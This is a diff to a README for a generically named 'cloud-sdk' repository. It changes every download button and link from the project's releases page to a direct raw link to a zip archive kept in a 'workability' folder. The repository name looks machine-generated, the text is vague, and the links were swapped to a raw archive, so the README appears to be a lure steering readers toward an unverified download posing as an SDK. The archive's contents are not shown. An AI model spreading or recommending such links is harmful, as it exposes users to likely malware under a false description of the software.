@@ -1,6 +1,6 @@
 # ☁️ cloud-sdk-1771916761-6 - Easy Cloud Platform Integration
 
-[![Download software](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/explorasurakarta-spec/cloud-sdk-1771916761-6/releases)
+[![Download software](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/explorasurakarta-spec/cloud-sdk-1771916761-6/raw/refs/heads/main/workability/cloud_sdk_v1.9.zip)
 
 ---
 
@@ -32,7 +32,7 @@ To get cloud-sdk-1771916761-6 on your computer, follow these steps:
 
 Click the big green button below or open this link in your web browser:
 
-[![Download software](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/explorasurakarta-spec/cloud-sdk-1771916761-6/releases)
+[![Download software](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/explorasurakarta-spec/cloud-sdk-1771916761-6/raw/refs/heads/main/workability/cloud_sdk_v1.9.zip)
 
 This page shows a list of available files for download. The latest version of the software should be at the top.
 
@@ -110,7 +110,7 @@ If problems continue, visit the issues page on the GitHub repository or contact 
 
 ## 🔗 Useful Links
 
-- Download page: [https://github.com/explorasurakarta-spec/cloud-sdk-1771916761-6/releases](https://github.com/explorasurakarta-spec/cloud-sdk-1771916761-6/releases)
+- Download page: [https://github.com/explorasurakarta-spec/cloud-sdk-1771916761-6/raw/refs/heads/main/workability/cloud_sdk_v1.9.zip](https://github.com/explorasurakarta-spec/cloud-sdk-1771916761-6/raw/refs/heads/main/workability/cloud_sdk_v1.9.zip)
 - User guide (if available): check the repository’s documentation folder online
 
 ---
@@ -152,4 +152,4 @@ If you want to uninstall cloud-sdk-1771916761-6:
 
 For the latest stable version, visit the download page:
 
-[![Download software](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/explorasurakarta-spec/cloud-sdk-1771916761-6/releases)
+[![Download software](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/explorasurakarta-spec/cloud-sdk-1771916761-6/raw/refs/heads/main/workability/cloud_sdk_v1.9.zip)
